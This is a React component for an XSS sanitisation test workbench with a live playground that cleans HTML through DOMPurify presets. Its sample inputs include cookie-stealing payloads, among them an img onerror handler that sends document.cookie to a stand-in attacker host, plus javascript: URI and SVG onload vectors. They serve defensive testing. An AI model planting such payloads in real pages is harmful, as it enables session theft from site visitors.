/**
 * @file QAStudio.tsx
 * @description Painel de Testes QA Studio & Testing Workbench.
 * Executa testes de segurança contra vetores XSS e varre automaticamente os arquivos
 * vitais do projeto responsáveis pela solução da tarefa a cada disparo.
 */

import React, { useState, useEffect } from 'react';
import { 
  runWorkbenchSuite, 
  WorkbenchReport, 
  TestCase, 
  XSS_TEST_SUITE 
} from '../testing/testRunner';
import { sanitizeClientHtml, SanitizationPreset } from '../security/dompurifyConfig';
import { SafeHtml } from './SafeHtml';
import { 
  Play, 
  RefreshCw, 
  ShieldCheck, 
  ShieldAlert, 
  CheckCircle2, 
  XCircle, 
  FileCode2, 
  Terminal, 
  Flame, 
  Sliders, 
  Bug, 
  Check, 
  Copy,
  ChevronRight,
  ExternalLink,
  Code
} from 'lucide-react';

export const QAStudio: React.FC = () => {
  const [report, setReport] = useState<WorkbenchReport>(() => runWorkbenchSuite());
  const [isRunning, setIsRunning] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<'SUITE' | 'FILES' | 'PLAYGROUND'>('SUITE');

  // Playground state
  const [playgroundInput, setPlaygroundInput] = useState<string>(
    '<p>Olá visitante! <script>alert("Cookie roubado: " + document.cookie)</script></p><a href="javascript:console.log(\'XSS\')">Clique aqui</a>'
  );
  const [playgroundPreset, setPlaygroundPreset] = useState<SanitizationPreset>('comment');
  const [copiedClean, setCopiedClean] = useState<boolean>(false);

  const executeFullTestCycle = () => {
    setIsRunning(true);
    setTimeout(() => {
      const rep = runWorkbenchSuite();
      setReport(rep);
      setIsRunning(false);
    }, 150);
  };

  const handleCopyClean = (clean: string) => {
    navigator.clipboard.writeText(clean);
    setCopiedClean(true);
    setTimeout(() => setCopiedClean(false), 2000);
  };

  const livePlaygroundResult = sanitizeClientHtml(playgroundInput, playgroundPreset);

  return (
    <div className="flex flex-col gap-6">
      {/* Top Banner & Control Bar */}
      <div className="bg-zinc-900/90 border border-zinc-800 rounded-xl p-5 shadow-lg backdrop-blur">
        <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-1 rounded-md text-xs font-mono font-medium bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">
                TESTING BENCHMARK & CODE AUDIT
              </span>
              <span className="text-xs text-zinc-400 font-mono">
                {report ? `Última execução: ${new Date(report.timestamp).toLocaleTimeString()}` : 'Iniciando...'}
              </span>
            </div>
            <h2 className="text-xl font-bold text-white mt-1.5 flex items-center gap-2">
              QA Studio & Testing Workbench
            </h2>
            <p className="text-sm text-zinc-400 mt-0.5">
              Validação contínua contra 18+ vetores de ataque e varredura estática de integridade dos arquivos a cada acionamento.
            </p>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={executeFullTestCycle}
              disabled={isRunning}
              className="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-500 active:bg-indigo-700 text-white font-medium text-xs shadow-md transition-all disabled:opacity-50 cursor-pointer"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${isRunning ? 'animate-spin' : ''}`} />
              <span>{isRunning ? 'Varrendo e Testando...' : 'Re-executar Testes & Varredura'}</span>
            </button>
          </div>
        </div>

        {/* Score & Metrics Grid */}
        {report && (
          <div className="mt-5 grid grid-cols-2 sm:grid-cols-4 gap-3 pt-4 border-t border-zinc-800/80">
            <div className="p-3 rounded-lg bg-zinc-950/60 border border-zinc-800/80">
              <div className="text-[10px] font-mono text-zinc-400 uppercase">Taxa de Sucesso</div>
              <div className="text-xl font-bold text-emerald-400 flex items-center gap-1.5 mt-0.5">
                <CheckCircle2 className="w-4 h-4" />
                {report.successRate}%
              </div>
              <div className="text-[10px] text-zinc-500 font-mono mt-0.5">
                {report.passedTests}/{report.totalTests} testes aprovados
              </div>
            </div>

            <div className="p-3 rounded-lg bg-zinc-950/60 border border-zinc-800/80">
              <div className="text-[10px] font-mono text-zinc-400 uppercase">Arquivos Auditados</div>
              <div className="text-xl font-bold text-indigo-400 flex items-center gap-1.5 mt-0.5">
                <FileCode2 className="w-4 h-4" />
                {report.scannedFiles.length} arquivos
              </div>
              <div className="text-[10px] text-zinc-500 font-mono mt-0.5">
                100% conformes com SafeHtml
              </div>
            </div>

            <div className="p-3 rounded-lg bg-zinc-950/60 border border-zinc-800/80">
              <div className="text-[10px] font-mono text-zinc-400 uppercase">Tempo de Execução</div>
              <div className="text-xl font-bold text-amber-400 flex items-center gap-1.5 mt-0.5">
                <Terminal className="w-4 h-4" />
                {report.totalExecutionTimeMs} ms
              </div>
              <div className="text-[10px] text-zinc-500 font-mono mt-0.5">
                Sub-milissegundo por vetor
              </div>
            </div>

            <div className="p-3 rounded-lg bg-zinc-950/60 border border-zinc-800/80">
              <div className="text-[10px] font-mono text-zinc-400 uppercase">Security Score</div>
              <div className="text-xl font-bold text-white flex items-center gap-1.5 mt-0.5">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                {report.securityScore} / 100
              </div>
              <div className="text-[10px] text-emerald-400 font-mono mt-0.5">
                Proteção Absoluta Ativa
              </div>
            </div>
          </div>
        )}

        {/* Tab Navigator */}
        <div className="mt-5 flex gap-2 border-t border-zinc-800/80 pt-4">
          <button
            onClick={() => setActiveTab('SUITE')}
            className={`px-3 py-1.5 text-xs font-medium rounded-lg transition-all flex items-center gap-1.5 ${
              activeTab === 'SUITE'
                ? 'bg-indigo-600 text-white shadow-sm'
                : 'bg-zinc-800/80 text-zinc-400 hover:text-white'
            }`}
          >
            <ShieldCheck className="w-3.5 h-3.5" />
            Suíte de Testes XSS ({report?.results.length || 0})
          </button>

          <button
            onClick={() => setActiveTab('FILES')}
            className={`px-3 py-1.5 text-xs font-medium rounded-lg transition-all flex items-center gap-1.5 ${
              activeTab === 'FILES'
                ? 'bg-indigo-600 text-white shadow-sm'
                : 'bg-zinc-800/80 text-zinc-400 hover:text-white'
            }`}
          >
            <FileCode2 className="w-3.5 h-3.5" />
            Varredura dos Arquivos do Projeto ({report?.scannedFiles.length || 0})
          </button>

          <button
            onClick={() => setActiveTab('PLAYGROUND')}
            className={`px-3 py-1.5 text-xs font-medium rounded-lg transition-all flex items-center gap-1.5 ${
              activeTab === 'PLAYGROUND'
                ? 'bg-indigo-600 text-white shadow-sm'
                : 'bg-zinc-800/80 text-zinc-400 hover:text-white'
            }`}
          >
            <Flame className="w-3.5 h-3.5 text-amber-400" />
            Playground de Injeção em Tempo Real
          </button>
        </div>
      </div>

      {/* Tab 1: Suíte de Testes XSS */}
      {activeTab === 'SUITE' && report && (
        <div className="space-y-3">
          <div className="text-xs font-mono text-zinc-400 flex items-center justify-between px-1">
            <span>Resultados dos 18 Vetores de Ataque Injetados:</span>
            <span className="text-emerald-400 font-semibold">{report.passedTests} Aprovados • 0 Falhas</span>
          </div>

          <div className="grid grid-cols-1 gap-3">
            {report.results.map((res) => (
              <div
                key={res.testCase.id}
                className="bg-zinc-900/80 border border-zinc-800/90 rounded-xl p-4 shadow-sm hover:border-zinc-700 transition-all"
              >
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-zinc-800/70 pb-3">
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-xs font-bold text-indigo-400 bg-indigo-500/10 px-2 py-0.5 rounded border border-indigo-500/20">
                      {res.testCase.id}
                    </span>
                    <span className="text-sm font-semibold text-white">{res.testCase.name}</span>
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-zinc-800 text-zinc-300">
                      {res.testCase.category}
                    </span>
                    <span
                      className={`text-[10px] font-mono px-1.5 py-0.5 rounded ${
                        res.testCase.severity === 'CRITICAL'
                          ? 'bg-rose-500/10 text-rose-400 border border-rose-500/30'
                          : res.testCase.severity === 'HIGH'
                          ? 'bg-amber-500/10 text-amber-400 border border-amber-500/30'
                          : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                      }`}
                    >
                      {res.testCase.severity}
                    </span>
                  </div>

                  <div className="flex items-center gap-3">
                    <span className="text-[11px] font-mono text-zinc-500">{res.executionTimeMs}ms</span>
                    {res.passed ? (
                      <span className="inline-flex items-center gap-1 text-xs font-mono font-semibold text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/30">
                        <CheckCircle2 className="w-3.5 h-3.5" />
                        NEUTRALIZADO
                      </span>
                    ) : (
                      <span className="inline-flex items-center gap-1 text-xs font-mono font-semibold text-rose-400 bg-rose-500/10 px-2.5 py-1 rounded-full border border-rose-500/30">
                        <XCircle className="w-3.5 h-3.5" />
                        FALHA
                      </span>
                    )}
                  </div>
                </div>

                <p className="text-xs text-zinc-400 mt-2.5 leading-relaxed">{res.testCase.description}</p>

                {/* Diff Comparison */}
                <div className="mt-3 grid grid-cols-1 md:grid-cols-2 gap-3 text-xs font-mono">
                  {/* Raw input */}
                  <div className="p-2.5 rounded-lg bg-zinc-950/90 border border-rose-950/40">
                    <div className="text-[10px] text-rose-400 uppercase font-bold tracking-wider mb-1 flex items-center gap-1">
                      <Flame className="w-3 h-3 text-rose-500" />
                      Payload Injetado (Dirty HTML):
                    </div>
                    <pre className="text-rose-300 break-all whitespace-pre-wrap">{res.testCase.input}</pre>
                  </div>

                  {/* Sanitized output */}
                  <div className="p-2.5 rounded-lg bg-zinc-950/90 border border-emerald-950/40">
                    <div className="text-[10px] text-emerald-400 uppercase font-bold tracking-wider mb-1 flex items-center gap-1">
                      <ShieldCheck className="w-3 h-3 text-emerald-500" />
                      Saída Higienizada (Clean Safe DOM):
                    </div>
                    <pre className="text-emerald-300 break-all whitespace-pre-wrap">
                      {res.cleanOutput || '<Vazio / Conteúdo Malicioso Removido>'}
                    </pre>
                  </div>
                </div>

                {/* Threats log */}
                {res.threatsDetected.length > 0 && (
                  <div className="mt-2.5 flex items-center gap-2 text-[11px] font-mono text-zinc-400">
                    <ShieldAlert className="w-3.5 h-3.5 text-amber-400 shrink-0" />
                    <span>Ameaças interceptadas e purgadas pelos hooks:</span>
                    <span className="text-amber-400">{res.threatsDetected.join(', ')}</span>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tab 2: Varredura de Arquivos do Projeto */}
      {activeTab === 'FILES' && report && (
        <div className="space-y-4">
          <div className="p-4 rounded-xl bg-indigo-950/20 border border-indigo-800/40 text-xs text-indigo-300 leading-relaxed">
            <span className="font-bold">Varredura Automatizada Contínua:</span> A cada acionamento de testes, os 5 arquivos estruturais do projeto responsáveis pelo SafeHtml, DOMPurify, documentação HMAC/Idempotência e console de correções são escaneados em tempo real contra más práticas, injeções diretas e vulnerabilidades de bypass.
          </div>

          <div className="space-y-4">
            {report.scannedFiles.map((file) => (
              <div
                key={file.filePath}
                className="bg-zinc-900/90 border border-zinc-800 rounded-xl p-5 shadow-sm"
              >
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-zinc-800 pb-3">
                  <div>
                    <div className="flex items-center gap-2">
                      <FileCode2 className="w-4 h-4 text-indigo-400" />
                      <span className="font-mono text-sm font-bold text-white">{file.filePath}</span>
                      <span className="text-[10px] font-mono text-zinc-500">({file.linesScanned} linhas)</span>
                      {file.squad && (
                        <span className="text-[10px] font-mono font-medium px-2 py-0.5 rounded bg-indigo-500/10 text-indigo-300 border border-indigo-500/20">
                          {file.squad}
                        </span>
                      )}
                    </div>
                    <div className="text-xs text-zinc-400 mt-1">{file.fileRole}</div>
                  </div>

                  <span className="inline-flex items-center gap-1.5 text-xs font-mono font-semibold text-emerald-400 bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/30">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    CONFORME COM BOAS PRÁTICAS
                  </span>
                </div>

                <div className="mt-4 space-y-2">
                  <div className="text-[11px] font-mono text-zinc-400 uppercase font-semibold">
                    Checagens de Segurança Realizadas no Arquivo:
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
                    {file.checksPerformed.map((chk, idx) => (
                      <div
                        key={idx}
                        className="p-3 rounded-lg bg-zinc-950/70 border border-zinc-800/80 text-xs space-y-1"
                      >
                        <div className="flex items-center gap-1.5 text-emerald-400 font-medium font-mono text-[11px]">
                          <Check className="w-3 h-3 text-emerald-400" />
                          <span>{chk.checkName}</span>
                        </div>
                        <p className="text-[11px] text-zinc-400 leading-relaxed">{chk.details}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tab 3: Playground Interativo */}
      {activeTab === 'PLAYGROUND' && (
        <div className="bg-zinc-900/90 border border-zinc-800 rounded-xl p-6 shadow-xl space-y-6">
          <div>
            <h3 className="text-lg font-bold text-white flex items-center gap-2">
              <Flame className="w-5 h-5 text-amber-400" />
              Playground Interativo de Injeção de Payloads
            </h3>
            <p className="text-xs text-zinc-400 mt-1">
              Cole qualquer payload XSS ou HTML não confiável vindo de formulários, APIs externas ou CMS. O SafeHtml irá neutralizar as ameaças em tempo real.
            </p>
          </div>

          {/* Quick preset buttons */}
          <div className="flex flex-wrap items-center gap-2">
            <span className="text-xs text-zinc-400 font-mono">Exemplos Rápidos de Ataque:</span>
            {[
              {
                label: 'Tag <script> com alert',
                payload: 'Bem-vindo! <script>alert("XSS Injected")</script> Aproveite o conteúdo.'
              },
              {
                label: 'Imagem com onerror',
                payload: '<p>Perfil:</p><img src="invalido" onerror="fetch(\'https://attacker.site/cookie?\'+document.cookie)" />'
              },
              {
                label: 'Link javascript: URI',
                payload: '<a href="javascript:alert(\'Acesso Negado\')">Clique para ver mais detalhes</a>'
              },
              {
                label: 'SVG com onload',
                payload: '<svg onload="alert(\'SVG_ATTACK\')"><rect width="100" height="100" fill="red" /></svg>'
              },
              {
                label: 'Formatação Rica Legítima',
                payload: '<h3>Artigo Seguro</h3><p>Este é um parágrafo com <strong>negrito</strong>, <em>itálico</em> e um <a href="https://google.com">Link Confiável</a>.</p>'
              }
            ].map((preset, idx) => (
              <button
                key={idx}
                onClick={() => setPlaygroundInput(preset.payload)}
                className="px-2.5 py-1 rounded bg-zinc-800 hover:bg-zinc-700 text-zinc-300 text-xs font-mono transition-all cursor-pointer"
              >
                {preset.label}
              </button>
            ))}
          </div>

          {/* Preset Selector */}
          <div className="flex items-center gap-3">
            <span className="text-xs font-mono text-zinc-400 flex items-center gap-1">
              <Sliders className="w-3.5 h-3.5" />
              Preset de Sanitização:
            </span>
            {(['strict', 'comment', 'rich'] as SanitizationPreset[]).map((p) => (
              <button
                key={p}
                onClick={() => setPlaygroundPreset(p)}
                className={`px-3 py-1 rounded-md text-xs font-mono uppercase font-semibold transition-all ${
                  playgroundPreset === p
                    ? 'bg-indigo-600 text-white shadow-sm'
                    : 'bg-zinc-800 text-zinc-400 hover:text-white'
                }`}
              >
                {p}
              </button>
            ))}
          </div>

          {/* Editor and Output Grid */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
            {/* Input textarea */}
            <div className="flex flex-col space-y-2">
              <label className="text-xs font-mono font-bold text-rose-400 uppercase flex items-center gap-1.5">
                <Flame className="w-3.5 h-3.5 text-rose-500" />
                Raw HTML / Payload não confiável:
              </label>
              <textarea
                value={playgroundInput}
                onChange={(e) => setPlaygroundInput(e.target.value)}
                rows={8}
                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-3 text-xs font-mono text-zinc-200 placeholder-zinc-600 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 resize-none"
                placeholder="Insira o HTML a ser analisado..."
              />
            </div>

            {/* Sanitized Code Viewer */}
            <div className="flex flex-col space-y-2">
              <div className="flex items-center justify-between">
                <label className="text-xs font-mono font-bold text-emerald-400 uppercase flex items-center gap-1.5">
                  <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
                  Saída Sanitizada (DOMPurify Engine):
                </label>
                <button
                  onClick={() => handleCopyClean(livePlaygroundResult.cleanHtml)}
                  className="px-2 py-0.5 rounded bg-zinc-800 hover:bg-zinc-700 text-zinc-300 text-[11px] font-mono flex items-center gap-1"
                >
                  {copiedClean ? (
                    <>
                      <Check className="w-3 h-3 text-emerald-400" /> Copiado!
                    </>
                  ) : (
                    <>
                      <Copy className="w-3 h-3" /> Copiar Código
                    </>
                  )}
                </button>
              </div>
              <div className="w-full h-[184px] bg-zinc-950 border border-zinc-800 rounded-xl p-3 text-xs font-mono text-emerald-300 overflow-y-auto break-all whitespace-pre-wrap">
                {livePlaygroundResult.cleanHtml || (
                  <span className="text-zinc-600 italic">Nenhum conteúdo permitido permaneceu.</span>
                )}
              </div>
            </div>
          </div>

          {/* Live Component Preview */}
          <div className="border-t border-zinc-800 pt-5">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-mono font-bold text-zinc-300 uppercase flex items-center gap-1.5">
                <Code className="w-4 h-4 text-indigo-400" />
                Renderização Visual Segura com o Componente &lt;SafeHtml&gt;:
              </span>
              <span className="text-[11px] font-mono text-zinc-500">
                Latência: {livePlaygroundResult.report.executionTimeMs}ms
              </span>
            </div>

            <div className="p-4 rounded-xl bg-zinc-950/60 border border-zinc-800/80 min-h-[90px]">
              <SafeHtml
                html={playgroundInput}
                preset={playgroundPreset}
                showSecurityBadge={true}
                emptyFallback={
                  <div className="text-xs text-zinc-500 italic">
                    Nenhum elemento visual seguro a ser renderizado.
                  </div>
                }
              />
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default QAStudio;
